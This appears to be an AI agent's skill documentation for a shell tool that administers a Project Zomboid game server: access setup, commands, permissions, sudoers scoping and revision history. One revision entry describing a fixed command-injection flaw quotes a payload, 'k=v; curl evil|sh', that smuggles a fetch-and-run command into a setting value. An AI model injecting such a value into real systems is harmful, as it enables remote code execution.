---
name: zomboid-admin
description: "Remote monitor, manage, update, and administer players on the Project Zomboid dedicated server at 192.168.1.221 (zomboid.service, alongside the Minecraft server on the same box)."
version: 1.11.1
author: HermesAgentV5
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [Zomboid, Minecraft, Monitoring, Remote, Server]
    related_skills: [vault-secret]
prerequisites:
  commands: [ssh]
  files:
    - tools/hermes-zomboid-admin.sh
    - tools/hermes-zomboid-admin-local.sh
---

# Zomboid Admin Remote Management

**Version:** 1.11.0

Manages the Project Zomboid dedicated server (`zomboid.service`, v42.20.2) running
as user `muncraft` on `192.168.1.221` — the same Debian 13 box that hosts the
Minecraft server. Zomboid does support RCON (`RCONPort=27015`, same Source
RCON protocol Minecraft uses) but `RCONPassword` is blank in this server's
`zomboid.ini`, which disables it. Rather than set a password and open another
network-facing admin port, administration here goes entirely through the
server's stdin console instead — no port, nothing to leak. This box's
`zomboid.service` keeps that console open via a FIFO
(`/opt/zomboid/server/console.fifo`), which is what `tools/hermes-zomboid-admin.sh`
writes to and reads responses back from the journal.

## When to Use

Invoke this skill whenever a request contains any of the following:

- "check the zomboid server" / "zomboid status" / "is zomboid up"
- "start/stop/restart zomboid" / "zomboid server health"
- "update zomboid" / "upgrade the zomboid server"
- "add a zomboid user" / "whitelist a zomboid player" / "zomboid admin" / "ban/kick a zomboid player"
- "who's on the zomboid server" / "zomboid players"
- "who has logged into zomboid" / "zomboid login history" / "zomboid accounts" / "zomboid audit log"
- "zomboid spawn rate" / "change zomboid loot/XP/sandbox settings" / "edit SandboxVars"
- "what are zomboid's current settings" / "report zomboid sandbox config"
- "reset the zomboid world" / "new zomboid map" / "wipe the zomboid save" / "new random seed"

## Server Connection

Accessed via the `192.168.1.221` SSH host alias (already configured in
`~/.ssh/config`, key-based, user `muncraft`) — no separate credential setup
needed.

`sshd_config`'s `AllowUsers` and `ufw` both restrict port 22 to `muncraft`
and `zomboid-admin` connecting from `10.129.1.0/24` (the admin subnet) or
`192.168.1.215` specifically. That second address isn't a separate trusted
host — it's what The Boss's actual `10.129.1.0/24` traffic arrives as by the
time it reaches this box, translated by NAT somewhere on the path between
the two subnets. Anyone extending this allow-list later should check what
source address their own traffic actually presents as (`echo $SSH_CLIENT`
on the box mid-session) rather than assuming their interface IP is what
`sshd`/`ufw` will see.

## Running the Tool

All actions go through `tools/hermes-zomboid-admin.sh` (in this repo, checked
out at `~/HermesAgentV5` on admin machines):

```bash
tools/hermes-zomboid-admin.sh <command> [args...]
```

**Status / health:**
```bash
tools/hermes-zomboid-admin.sh status     # service state, ports, resource use, recent errors, player count
tools/hermes-zomboid-admin.sh players    # who's connected right now
tools/hermes-zomboid-admin.sh logins     # every known account: role, SteamID, last-connection timestamp
tools/hermes-zomboid-admin.sh auditlog   # last 20 kick/ban actions
```

**Lifecycle:**
```bash
tools/hermes-zomboid-admin.sh start
tools/hermes-zomboid-admin.sh stop
tools/hermes-zomboid-admin.sh restart
tools/hermes-zomboid-admin.sh update     # stop, steamcmd validate (app 380870), start
```

**World:**
```bash
tools/hermes-zomboid-admin.sh newworld --confirm   # wipe the map, generate a fresh one with a new random seed
```
Stops the service, generates a new 16-char alphanumeric seed, backs up `zomboid.ini` and writes
the new `Seed=`, moves the current `Saves/Multiplayer/zomboid/` directory aside with a timestamp
(never deletes it), then starts the service — PZ generates a brand-new world on next boot since
no save exists under that name anymore. Whitelist, access levels, and ban/audit history are
**not** affected: they live in the account DB (`zomboid.db`), a separate file this command never
touches. `--confirm` is required or the command refuses to run.

**User management:**
```bash
tools/hermes-zomboid-admin.sh adduser <user> [pass]              # whitelist add, password optional
tools/hermes-zomboid-admin.sh removeuser <user>                  # whitelist remove
tools/hermes-zomboid-admin.sh setaccesslevel <user> <level>      # banned|user|priority|observer|gm|moderator|admin (lowercase)
tools/hermes-zomboid-admin.sh setpassword <user> <newpass>
tools/hermes-zomboid-admin.sh banuser <user> [reason]
tools/hermes-zomboid-admin.sh unbanuser <user>
tools/hermes-zomboid-admin.sh kick <user> [reason]
```

**Sandbox settings** (zombie spawn rate, loot, XP, etc. — `SandboxVars.lua`, not `zomboid.ini`):
```bash
tools/hermes-zomboid-admin.sh sandboxvars                       # dump the whole file (~280 lines, comments stripped)
tools/hermes-zomboid-admin.sh sandboxvars PopulationMultiplier RespawnHours  # look up just these keys
tools/hermes-zomboid-admin.sh sandboxvar <key>=<value> [<key2>=<value2> ...]
# Example: tools/hermes-zomboid-admin.sh sandboxvar PopulationMultiplier=1.2 RespawnHours=24
```
Validates every key actually exists in the file before changing anything, backs the file up
(`zomboid_SandboxVars.lua.bak.<timestamp>`, alongside the original — not pruned automatically),
edits in place, then restarts the service (SandboxVars is only read at startup — there is no live
reload for it, unlike `zomboid.ini`'s `reloadoptions`). Values must be one of three shapes — a bare
number (`0.65`), `true`/`false`, or a plain double-quoted string with no embedded quotes (`"text"`) —
checked before anything is written, added in a 2026-08-14 security review after a real command-
injection finding (an unvalidated value reached a shell command string unescaped). Still not
validated against the key's real type or min/max range within that shape.

**Other:**
```bash
tools/hermes-zomboid-admin.sh broadcast "<message>"   # servermsg to all connected players
tools/hermes-zomboid-admin.sh save                    # save the world now
tools/hermes-zomboid-admin.sh console '<raw command>' # anything not covered above, verbatim
```

## Local Fork (`hermes-zomboid-admin-local.sh`) — for a non-`muncraft` admin

`tools/hermes-zomboid-admin.sh` above assumes the caller has the `muncraft`
SSH private key and `muncraft`'s own `ALL:ALL` sudo — appropriate for The
Boss, not for authorizing someone else (e.g. a trusted player) to administer
just this game server. `tools/hermes-zomboid-admin-local.sh` is a full-parity
fork of every subcommand above, meant to run **on** `192.168.1.221` itself
(not over SSH from elsewhere) as a separate, narrowly-scoped account:

- Deployed on the box at `/opt/zomboid/hermes-zomboid-admin-local.sh` (mode
  `775`, owner `muncraft`, group `muncraft`).
- The account is `zomboid-admin` (uid 1001), a supplementary member of the
  `muncraft` group and nothing else — it does **not** have `muncraft`'s own
  `ALL:ALL` sudo, does not own the game files, and has no SSH key of
  muncraft's to reach anywhere else.
- Permission model (group access, not `muncraft`'s own ownership):
  `/home/muncraft` is `drwx--x---` (group can traverse by exact path, not
  list — `.ssh`, `.bash_history`, etc. stay invisible to `zomboid-admin`);
  `/opt/zomboid/server` and `/opt/zomboid/steamcmd` are `775` (group can
  write, needed for `update`); `console.fifo` is `660`; `SandboxVars.lua`
  was already group-writable and `zomboid.db` already world-writable (both
  pre-existing PZ defaults, not changed for this).
- **Sudoers is installed** at `/etc/sudoers.d/zomboid-admin` (mode `440`,
  installed by The Boss after this session's own permission classifier
  correctly refused to write it unattended):
  ```
  # Zomboid player-admin: narrowly scoped to exactly what
  # tools/hermes-zomboid-admin-local.sh calls via sudo -- nothing else.
  zomboid-admin ALL=(root) NOPASSWD: /usr/bin/systemctl start zomboid.service, /usr/bin/systemctl stop zomboid.service, /usr/bin/systemctl restart zomboid.service, /usr/bin/systemctl status zomboid.service*, /usr/bin/systemctl is-active zomboid.service, /usr/bin/journalctl -u zomboid.service*

  # muncraft (the box owner) can impersonate the player-admin account it created,
  # for setup/testing/troubleshooting -- does not widen zomboid-admin's own rights.
  muncraft ALL=(zomboid-admin) NOPASSWD: ALL
  ```
  Verified live, as the actual account (`sudo -u zomboid-admin ...` via the
  `muncraft` impersonation grant above, not just permission inspection):
  `status`, `sandboxvars`, `logins`, and `restart` (the sudo-gated
  `systemctl`/`journalctl` path specifically) all ran correctly and the
  server rebooted cleanly afterward.
- **Login credential:** a password was set and stored in Vaultwarden as
  `Zomboid Admin - muncraft` (fetch via `vault-secret` —
  `tools/vault-get-secret.sh "Zomboid Admin - muncraft" password`). No
  `authorized_keys` is configured, so access is password-only for now; add
  a key under `/home/zomboid-admin/.ssh/authorized_keys` (mode `600`, owned
  `zomboid-admin:zomboid-admin`) if key-based login is wanted later.
- To use it: `ssh zomboid-admin@192.168.1.221
  /opt/zomboid/hermes-zomboid-admin-local.sh status` (or any other
  subcommand) — same full command set as the remote tool, documented above.
- A player-facing quick-start PDF for this account lives at
  `skills/zomboid-admin/player-admin-guide.pdf`, generated from
  `tools/hermes-zomboid-player-guide.py` (`python3
  tools/hermes-zomboid-player-guide.py` to regenerate). The PDF had no
  source file for a while — it went stale (missing `newworld`) as a
  result — so any future change to `hermes-zomboid-admin-local.sh`'s
  command set should also update the generator script, not just the
  script itself.
- `/home/muncraft/Zomboid/Server/` (holds `zomboid.ini` and
  `zomboid_SandboxVars.lua`) is `775`, group-writable — needed for
  `newworld`'s `zomboid.ini` edit and, it turns out, for `sandboxvar`'s
  `SandboxVars.lua` edit too: `sed -i` needs *directory* write for its
  temp file, not just file write, so `sandboxvar`'s write path had been
  silently broken for this account the whole time (only the read-only
  `sandboxvars` was ever verified live — see 1.9.0 in the revision
  history). Fixing the directory permission for `newworld` fixed both.

## What `status` Checks

- `systemctl status zomboid.service` (active state, uptime, memory)
- Listening UDP ports (16261 game, 16262 secondary)
- `ProjectZomboid64` process RSS/CPU/uptime
- Disk usage on the server directory
- Recent ERROR/WARN lines from the last 200 journal lines
- Current player count (via the console)

## Notes

- Server files: `/opt/zomboid/server/` (steamapps `force_install_dir`)
- SteamCMD: `/opt/zomboid/steamcmd/`
- Account data lives in the server's own SQLite save DB
  (`/home/muncraft/Zomboid/db/zomboid.db`, tables `whitelist`, `role`,
  `userlog`, ...) — not a flat `whitelist.json`/`ops.json` like Minecraft.
  `logins` and `auditlog` read it via `python3`'s stdlib `sqlite3` module
  over SSH; the `sqlite3` CLI isn't installed on this host, so don't assume
  it's there for ad-hoc queries.
- `setaccesslevel` (and every other user-management command) takes the PZ
  **username** — the `whitelist` table's account name — never the SteamID.
  The SteamID column is just a linkage recorded once that account actually
  connects; it isn't valid input to any admin command. To grant a connected
  player admin, use the account name shown by `logins`, e.g.
  `setaccesslevel "Axiom1" "admin"`.
- Console FIFO: `/opt/zomboid/server/console.fifo` — held open read-write by
  the `bash -c 'exec 3<>...; exec start-server.sh ... <&3'` wrapper in
  `zomboid.service`'s `ExecStart`. If the FIFO is ever missing, the
  `ExecStartPre=-/usr/bin/mkfifo -m 600 ...` line recreates it on next start
  (the leading `-` makes systemd ignore the "already exists" failure on
  every start after the first).
- Full boot (world load) takes ~40-50s after `systemctl start` — commands
  sent to the console before `*** SERVER STARTED ****` appears in the
  journal are silently lost (no queueing).
- ufw: `16261/udp` is open to the internet; `27015` (RCON) is explicitly
  denied — currently redundant since `RCONPassword` is blank and nothing is
  listening there, but it's cheap defense-in-depth: if anyone ever sets an
  RCON password on this server without also checking the firewall, this
  rule is what stops it from being reachable externally. Leave it in place.
- No credentials are stored anywhere for this skill — the console channel
  isn't network-exposed, and SSH auth is key-based via `~/.ssh/config`.
- Two separate config files, two separate mechanisms: `zomboid.ini`
  (`/home/muncraft/Zomboid/Server/zomboid.ini`, server/connection behavior —
  `Open`, `MaxPlayers`, `PVP`, `Password`, `RCONPort`...) hot-reloads via the
  console's `reloadoptions` command. `zomboid_SandboxVars.lua` (same
  directory, gameplay/world settings — zombie population, loot, XP) does
  not; `sandboxvar` always restarts the service to apply. There's no
  `sandboxvar`-equivalent for `zomboid.ini` yet — that would need
  `reloadoptions` instead of a restart, not written because nothing has
  asked for it.

## Pitfalls

### `/help` text does not match reality
The server's own `help` console command describes `setaccesslevel` as taking
`Admin, Moderator, Overseer, GM, Observer` — the server actually rejects all
of those and wants lowercase (`banned, user, priority, observer, gm,
moderator, admin`; there is no `overseer`). This was confirmed by triggering
the server's own "unknown access level" error live, not by trusting the
`/help` description. Similarly, `/help` describes the kick command as
`/kickuser`, but the command actually registered is `kick`. Don't trust this
server's own help text for exact command names/arguments without a live
test — `tools/hermes-zomboid-admin.sh` already encodes the verified forms.

### Console commands need two full round trips to see a result
`hermes-zomboid-admin.sh` sleeps 2s after writing to the FIFO before reading
the journal back. Under heavy server load that may not be enough for a
response to land — rerun the same `console`/status query rather than
assuming failure.

### Restart interrupts connected players
`restart` and `update` both stop the process (graceful save on SIGTERM, world
data is not at risk) but disconnect anyone currently playing. Consider
`broadcast` a warning first, or check `players` before restarting during
active hours.

### `newworld` boot takes longer than a normal restart
Generating a fresh map on first boot after a reset takes noticeably longer
than the usual ~40-50s restart (world gen vs. loading an existing save).
Don't assume the server is hung if `players`/`status` don't respond
immediately after `newworld --confirm` finishes — give it more time before
treating it as stuck.

### RAM budget shared with Minecraft
Both `zomboid.service` and `minecraft.service` run on the same box with
`-Xmx8g` each. At 32GB total system RAM this has headroom, but don't assume
you can raise both caps arbitrarily — check `status` on both servers before
increasing either.

## Revision History

| Version | Date | Change |
|---|---|---|
| 1.11.1 | 2026-08-30 | HermesAgentV5 consolidation: author: field and in-body usage-example paths repointed from HermesAgentV4 to HermesAgentV5. |
| 1.0.0 | 2026-08-06 | Initial version — built alongside `tools/hermes-zomboid-admin.sh` and the console-FIFO setup on `zomboid.service`, right after standing up the Zomboid dedicated server itself. All command syntax verified live against the running server rather than assumed from its own `/help` text, which turned out to be wrong in two places (see Pitfalls). |
| 1.1.0 | 2026-08-06 | Corrected a factual error from 1.0.0: Zomboid does support RCON (`RCONPort=27015` in `zomboid.ini`, same protocol Minecraft uses) — it isn't absent, just disabled here via a blank `RCONPassword`. Found by reading `zomboid.ini` directly while answering a question about player-management mechanics. Also reframed the `ufw deny 27015` rule from "inert/mislabeled" to correctly-targeted defense-in-depth, now that RCON is known to be a real (if currently disabled) feature. |
| 1.2.0 | 2026-08-07 | Added `logins` and `auditlog` subcommands, closing the gap found while answering "what usernames have logged into Zomboid" (there was no way to see login history short of hand-querying the DB over SSH). Also documented that user-management commands take the PZ username, never the SteamID — the actual discovery driving this update was live data: the whitelist DB already had a real, unexpected connection on record (`Axiom1`, first seen 2026-08-06 10:05:59) alongside the never-used bootstrap `admin` account. |
| 1.3.0 | 2026-08-07 | Added `sandboxvar` — closes the gap found while explaining where zombie spawn rate is configured (`zomboid_SandboxVars.lua`, not `zomboid.ini`): there was no way to change it short of a manual SSH edit + restart. Validates keys exist before writing, backs the file up first, restarts to apply (SandboxVars has no live-reload path, unlike `zomboid.ini`'s `reloadoptions`). Tested live: rejected a bad pair and an unknown key correctly, then a real two-key change (`FirearmNoiseMultiplier`/`FirearmJamMultiplier`) confirmed the regex only touches the exact key, not similarly-named neighbors (`FirearmMoodleMultiplier`, `FirearmWeatherMultiplier` were untouched), then reverted. |
| 1.4.0 | 2026-08-07 | Added `sandboxvars` (note the "s") — the read-only companion `sandboxvar` (1.3.0) didn't cover: no args dumps the full current settings file, named args look up specific keys. Requested right after 1.3.0 shipped, since a write-only settings tool with no way to see current values before changing them was an obvious gap. |
| 1.5.0 | 2026-08-07 | Added the local fork (`tools/hermes-zomboid-admin-local.sh`) and its supporting infra, for authorizing a player to administer the server without handing over the `muncraft` SSH key or its `ALL:ALL` sudo: a dedicated `zomboid-admin` account (supplementary member of the `muncraft` group only), scoped file permissions (`/home/muncraft` opened to `--x` for the group, `/opt/zomboid/{server,steamcmd}` opened to group-write, `console.fifo` to `660`), and a syntax-validated sudoers drop-in. The sudoers install itself was refused by this session's own permission classifier (writing `/etc/sudoers.d/` unattended) — documented above as the one remaining manual step, along with provisioning the account's actual login credential, both correctly left for The Boss to do rather than worked around. |
| 1.6.0 | 2026-08-07 | The Boss installed the sudoers drop-in and set a password (stored in Vaultwarden as `Zomboid Admin - muncraft`). Re-verified live as the actual restricted account this time, not just by permission inspection: `sudo -u zomboid-admin` (via the `muncraft` impersonation grant) ran `status`, `sandboxvars`, `logins`, and `restart` correctly, with a clean reboot confirmed afterward — closes out the one gap 1.5.0 left open. |
| 1.7.0 | 2026-08-09 | Fixed a real access bug found while investigating "failed zomboid-admin logins": `sshd_config`'s `AllowUsers` listed `zomboid_admin` (underscore) instead of the actual account `zomboid-admin` (hyphen), so the account could never authenticate at all — the "failed logins" in the journal were The Boss's own setup attempts being rejected before password auth even ran. Fixed the typo and, per The Boss's request, scoped SSH (`AllowUsers` + `ufw`, both were previously open to `Anywhere`/all local users) down to `muncraft` and `zomboid-admin` from `10.129.1.0/24` or `192.168.1.215` only. Also removed an unexplained `Match Address 192.168.1.215 { PasswordAuthentication yes }` block made redundant by the fix (turned out to be a NAT-translation artifact of The Boss's own admin traffic, not a stray rule — see the new Server Connection note). Every step verified live with a fresh connection before proceeding to the next (config syntax check → reload → reconnect test → add scoped ufw rules → reconnect test → remove the old open rules → reconnect test) specifically to avoid a self-lockout requiring console access, per the pitfall discovered earlier in this same session when the local firewall was independently found blocking SSH entirely. |
| 1.8.0 | 2026-08-09 | Added `newworld --confirm`, closing the gap found right after 1.7.0 shipped: no way to reset the map to a fresh world with a new seed without a manual SSH edit. Confirmed live on the box that the account DB (`zomboid.db`) lives entirely outside `Saves/Multiplayer/<servername>/` — a separate directory tree — so whitelist/access-level/ban data survives a world wipe automatically as long as the command never touches that file, which it doesn't. Old save and `zomboid.ini` are moved/backed up with a timestamp rather than deleted. Initially left out of the `zomboid-admin` local fork over a file-permission gap (see 1.9.0, which closed it). |
| 1.9.0 | 2026-08-09 | Reversed 1.8.0's call and added `newworld` to the local fork too, at The Boss's request. Root-caused the actual blocker first rather than guessing: `/home/muncraft/Zomboid/Server/` (holds `zomboid.ini` and `zomboid_SandboxVars.lua`) was `755`, not group-writable, and `sed -i` needs *directory* write for its temp-file-then-rename step, not just write access to the target file — so even though `zomboid_SandboxVars.lua` itself has been `664` since before this skill existed, `zomboid-admin` could never actually have written to it. That means `sandboxvar`'s write path (as opposed to the read-only `sandboxvars`, which *was* verified live back in 1.6.0) had silently never worked for this account. `chmod g+w` on the directory fixed both `newworld` and the pre-existing `sandboxvar` gap in one move — verified live as the real restricted account (via the `muncraft` impersonation grant) for both `zomboid.ini` and `zomboid_SandboxVars.lua` before writing any code. Deployed the updated `hermes-zomboid-admin-local.sh` to `/opt/zomboid/` on the box, matching mode/ownership of the file it replaced. |
| 1.9.1 | 2026-08-09 | Fixed a stale doc gap: `newworld` shipped in 1.8.0 but "When to Use" was never given a trigger phrase for it, unlike every other command family — a future "reset the zomboid world" request could have missed invoking this skill entirely. Also spot-checked the `*** SERVER STARTED ****` banner text (asymmetric asterisk count looked like a possible typo) against the live journal — it's genuinely what PZ logs, not an error, so left as-is. |
| 1.10.0 | 2026-08-09 | `skills/zomboid-admin/player-admin-guide.pdf` (the player-facing quick-start handed out with `zomboid-admin` access) had gone stale the same way — missing `newworld` — and, worse, had no source file at all to regenerate it from; it was a hand-made PDF with no way to edit it short of rebuilding from scratch. Added `tools/hermes-zomboid-player-guide.py` (fpdf2) as that missing source of truth, matching the original's look, and used it to add a heavily-flagged "5. Starting a Brand New World" section. Linked the new generator back into this doc so the same staleness doesn't recur silently next time the local fork's command set changes. |
| 1.11.0 | 2026-08-14 | Security review found a real command-injection RCE in both `hermes-zomboid-admin.sh` and `hermes-zomboid-admin-local.sh`: `sandboxvar`'s key/value were spliced unescaped into a remote/local shell command string, so a crafted value like `k=v; curl evil\|sh` executed arbitrary code — a serious finding for `hermes-zomboid-admin-local.sh` specifically, since that's the exact tool this skill hands to a trusted player rather than The Boss. Fixed in both scripts (1.5.0→1.6.0 and 1.1.0→1.2.0) with a strict allowlist on both key and value, plus FIFO-injection guards (an embedded newline or double quote in any username/reason/message argument is now refused before it reaches the console FIFO). Both scripts' executable bits were also found missing in git (`100644`, silently broken since whenever they were last committed from the Windows dev machine — the same bug class §7/Phase 15 already hit once) and fixed. Sandbox value documentation above updated to match the new validation. `newworld --confirm`'s CLI-flag gate (not `hermes-confirm-gate.sh`) reviewed and recorded as a deliberate, accepted exception to `IMPLEMENTATION_PLAN.md` §5 constraint 5 — see the comment above `cmd_newworld()` in both scripts for the rationale. |
